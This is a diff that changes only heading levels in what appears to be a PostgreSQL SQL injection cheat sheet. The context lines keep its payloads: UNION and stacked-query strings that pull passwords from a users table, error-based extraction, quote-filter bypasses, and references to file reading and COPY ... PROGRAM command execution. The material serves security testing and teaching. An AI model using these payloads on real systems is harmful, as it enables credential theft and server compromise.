@@ -7,11 +7,9 @@ tags: ["postgresql specific", "special syntax", "version compatibility"]
 lastUpdated: 2025-12-14
 ---
 
-## PostgreSQL-specific Code
-
 PostgreSQL provides several unique syntax features and functions that can be leveraged in SQL injection attacks. Understanding these PostgreSQL-specific techniques can help bypass filters and execute complex injections.
 
-### Dollar-Quoted Strings
+## Dollar-Quoted Strings
 
 PostgreSQL's unique string quoting mechanism allows strings without single quotes:
 
@@ -28,7 +26,7 @@ SELECT $tag$This string contains $$nested$$ quotes$tag$;
 
 This is extremely useful for bypassing single-quote filters.
 
-### Type Cast Shorthand (::)
+## Type Cast Shorthand (::)
 
 PostgreSQL's `::` cast operator is unique and useful for database detection:
 
@@ -49,7 +47,7 @@ SELECT '{1,2,3}'::int[];
 ' AND 1::int=1 --
 ```
 
-### RETURNING Clause
+## RETURNING Clause
 
 PostgreSQL allows returning data from INSERT, UPDATE, and DELETE:
 
@@ -67,7 +65,7 @@ DELETE FROM users WHERE id=1 RETURNING username, password;
 '; INSERT INTO log (data) VALUES ('x') RETURNING (SELECT password FROM users LIMIT 1) --
 ```
 
-### Array Syntax
+## Array Syntax
 
 PostgreSQL has native array support:
 
@@ -87,7 +85,7 @@ SELECT unnest(ARRAY[1,2,3]);
 ' UNION SELECT 1, array_to_string(array_agg(username), ':') FROM users --
 ```
 
-### PostgreSQL-specific Functions
+## PostgreSQL-specific Functions
 
 Functions unique to PostgreSQL:
 
@@ -104,7 +102,7 @@ Functions unique to PostgreSQL:
 | `pg_read_file()`    | Read file from server                          |
 | `pg_ls_dir()`       | List directory contents                        |
 
-### String Aggregation
+## String Aggregation
 
 ```sql
 -- Aggregate all usernames into single string
@@ -117,7 +115,7 @@ SELECT string_agg(username, ',' ORDER BY username) FROM users;
 SELECT string_agg(DISTINCT role, ',') FROM users;
 ```
 
-### Generate Series
+## Generate Series
 
 Useful for brute-force and enumeration:
 
@@ -132,7 +130,7 @@ SELECT generate_series('2025-01-01'::date, '2025-01-10'::date, '1 day');
 SELECT chr(n) FROM generate_series(32, 126) AS n;
 ```
 
-### XML Helper Functions
+## XML Helper Functions
 
 Extract data in XML format (bypasses output restrictions):
 
@@ -153,7 +151,7 @@ SELECT database_to_xmlschema(true, true, '');
 ' UNION SELECT 1, query_to_xml('SELECT password FROM users',true,true,'')::text --
 ```
 
-### COPY Command
+## COPY Command
 
 PostgreSQL's COPY is unique and powerful for file I/O and command execution. See also: [Reading Files](/postgresql/reading-files) and [Command Execution](/postgresql/command-execution).
 
@@ -220,7 +218,7 @@ attacker    hacked
 - Disable `COPY ... PROGRAM` at compile time if not needed (`--disable-copy-program`)
 - Monitor for COPY commands in query logs
 
-### Large Objects
+## Large Objects
 
 PostgreSQL's large object system for file operations:
 
@@ -241,7 +239,7 @@ SELECT lo_from_bytea(0, 'file content'::bytea);
 SELECT lo_unlink(16444);
 ```
 
-### PL/pgSQL Anonymous Blocks
+## PL/pgSQL Anonymous Blocks
 
 Execute procedural code without creating a function:
 
@@ -263,7 +261,7 @@ END
 $$;
 ```
 
-### Error-Based Data Extraction
+## Error-Based Data Extraction
 
 PostgreSQL-specific error-based techniques:
 
@@ -281,7 +279,7 @@ SELECT ('~' || (SELECT version()) || '~')::int;
 -- Error: invalid input syntax for type integer: "~PostgreSQL 15.4~"
 ```
 
-### Conditional Expressions
+## Conditional Expressions
 
 PostgreSQL CASE expressions:
 
@@ -301,7 +299,7 @@ SELECT NULLIF(1, 1);  -- Returns NULL
 SELECT NULLIF(1, 2);  -- Returns 1
 ```
 
-### Regular Expression Operators
+## Regular Expression Operators
 
 PostgreSQL has powerful regex support:
 
@@ -321,7 +319,7 @@ SELECT regexp_matches('admin123', '([a-z]+)([0-9]+)');
 SELECT regexp_replace('admin123', '[0-9]', 'X', 'g');
 ```
 
-### PostgreSQL Information Tables
+## PostgreSQL Information Tables
 
 PostgreSQL uses both information_schema and pg_catalog:
 
@@ -340,7 +338,7 @@ SELECT rolname FROM pg_roles;
 SELECT usename FROM pg_user;
 ```
 
-### Session Variables
+## Session Variables
 
 Unlike MySQL's `@@variables`, PostgreSQL uses functions:
 
@@ -360,7 +358,7 @@ SHOW server_version;
 SHOW data_directory;
 ```
 
-### Prepared Statements (Dynamic SQL)
+## Prepared Statements (Dynamic SQL)
 
 Execute dynamic SQL:
 
@@ -378,9 +376,9 @@ END
 $$;
 ```
 
-### Version-specific Features
+## Version-specific Features
 
-#### JSON (9.2+), JSONB (9.4+)
+### JSON (9.2+), JSONB (9.4+)
 
 JSON functions are useful for extracting structured data:
 
@@ -398,7 +396,7 @@ SELECT '{"a":1}'::jsonb @> '{"a":1}'::jsonb;  -- Containment check
 SELECT json_agg(row_to_json(u)) FROM users u;
 ```
 
-#### Procedures (11+)
+### Procedures (11+)
 
 PostgreSQL 11+ supports stored procedures with `CALL`. Exploiting procedures requires **prior enumeration** to discover procedure names and signatures.
 
@@ -432,7 +430,7 @@ CALL schema.procedure_name(arg1, arg2);
 
 **Note:** Unlike functions, procedures cannot be called in SELECT statements—they require the `CALL` statement, which typically needs stacked query support in the injection context.
 
-#### Other Version Features
+### Other Version Features
 
 | Version | Feature                 | Injection Relevance                        |
 | ------- | ----------------------- | ------------------------------------------ |
@@ -441,7 +439,7 @@ CALL schema.procedure_name(arg1, arg2);
 | 10+     | Logical replication     | Administrative, requires superuser         |
 | 12+     | Generated columns       | Schema feature, not directly exploitable   |
 
-### Key Differences from MySQL
+## Key Differences from MySQL
 
 | Feature            | PostgreSQL                 | MySQL                                                           |
 | ------------------ | -------------------------- | --------------------------------------------------------------- |
